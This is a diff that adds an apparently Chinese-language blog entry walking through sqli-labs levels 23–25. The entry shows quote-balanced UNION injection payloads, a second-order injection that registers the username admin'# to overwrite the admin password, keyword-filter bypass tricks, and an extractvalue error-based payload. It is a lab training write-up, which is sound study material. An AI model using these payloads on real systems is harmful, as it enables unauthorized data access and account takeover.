@@ -15,6 +15,28 @@
       </tags>
   </entry>
   <entry>
+    <title>sql-lab 23-25</title>
+    <url>//sql-lab23%E5%90%AF/</url>
+    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/ec93431c08b244439a047601c39c2d32.png" alt="在这里插入图片描述"><br>人生海海，又何必在意一时浮沉。</p>
+<span id="more"></span>
+<h1><span id="sql-lab-23">sql-lab 23</span></h1><p>源码如下图所示<br><img src="https://img-blog.csdnimg.cn/f1430cd11f294e40b8d4cab1d63677b6.png" alt="在这里插入图片描述"><br>如图可见注释符被转义了，因此在这一关无法使用注释符来执行sql注入，猜解出包裹方式为’后，我们可以利用’来作为注释符，<br>此时写payload可以使用两种</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span>或</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>使用联合查询即可查询出回显位，然后开始进行sql注入，得到数据库等数据</p>
+<h1><span id="sql-lab-24">sql-lab 24</span></h1><p>此关利用了二次注入，具体可以观看<a href="https://quan9i.github.io/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">此篇文章</a><br>进入界面后如下图所示<br><img src="https://img-blog.csdnimg.cn/5345d1aa85ae43209070fbbfe9453555.png" alt="在这里插入图片描述"><br>发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图<br><img src="https://img-blog.csdnimg.cn/3b04cc57f22d44fa9896d6326124b298.png" alt="在这里插入图片描述"><br>此时查询数据库，发现注册的已经插入数据库中<br><img src="https://img-blog.csdnimg.cn/e82186b3da214199b1983c1572ffd6a5.png" alt="在这里插入图片描述"><br>我们登录看看，如下图<br><img src="https://img-blog.csdnimg.cn/14dba507c8fc4a72ae201ef26c5f12c5.png" alt="在这里插入图片描述"><br>发现是更改密码的，我们试着将111改123，此时查看数据库<br><img src="https://img-blog.csdnimg.cn/f2157307c46143f2879df89b081d3b93.png" alt="在这里插入图片描述"><br>发现更改了admin的密码，即说明注入成功！<br>二次注入简单利用完成！</p>
+<h1><span id="sql-lab-25">sql-lab 25</span></h1><p>源码如下图所示<br><img src="https://img-blog.csdnimg.cn/192bf7b24b6749189210b0308ccaf3bb.png" alt="在这里插入图片描述"><br>可以看出and 和 or 被过滤掉了，因此我们可以采用的方法有以下几种</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）大小写变形 <span class="keyword">Or</span>,<span class="keyword">OR</span>,<span class="keyword">oR</span></span><br><span class="line">（<span class="number">2</span>）编码，hex，urlencode</span><br><span class="line">（<span class="number">3</span>）添加注释<span class="comment">/*or*/</span></span><br><span class="line">（<span class="number">4</span>）利用符号 <span class="keyword">and</span>=&amp;&amp; <span class="keyword">or</span>=||</span><br><span class="line">（<span class="number">5</span>）双写绕过 oorr</span><br></pre></td></tr></table></figure>
+<p>注入sql语句可以用联合查询和报错注入<br>联合查询payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() %23</span></span><br></pre></td></tr></table></figure>
+<p>报错注入payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;|| extractvalue(1,concat(0x7e,database()))--+</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>get注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>二次注入</title>
     <url>//%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/093bbf3af4b14afdb4fb47c31cb26bac.png" alt="在这里插入图片描述"><br>最终倦鸟归栖落叶归根你我也有始有终.</p>
